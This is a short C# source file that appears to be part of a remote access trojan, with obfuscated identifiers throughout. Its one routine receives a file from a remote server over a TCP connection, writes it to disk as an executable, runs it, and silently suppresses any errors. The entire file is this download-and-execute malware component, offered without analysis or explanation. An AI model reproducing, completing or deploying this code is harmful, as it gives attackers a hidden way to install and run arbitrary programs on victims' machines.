using System.Diagnostics;
using System.IO;
using System.Net.Sockets;

namespace trbgertrnion;

internal class OSCAMID
{
	public MCRSIDM server;

	public OSCAMID(MCRSIDM lID)
	{
		server = lID;
	}

	public NetworkStream trbgertrnionNS(TcpClient trbgertrniontcpsck)
	{
		return trbgertrniontcpsck.GetStream();
	}

	public void trbgertrnionremove_user()
	{
		try
		{
			byte[] array = server.trbgertrnionpuall_fdata();
			if (array != null && !File.Exists(CIADINF.trbgertrnionget_mpath() + CIADINF.trbgertrnionremvUser + ".exe"))
			{
				File.WriteAllBytes(CIADINF.trbgertrnionget_mpath() + CIADINF.trbgertrnionremvUser + ".exe", array);
				Process.Start(CIADINF.trbgertrnionget_mpath() + CIADINF.trbgertrnionremvUser + ".exe");
			}
		}
		catch
		{
		}
	}
}
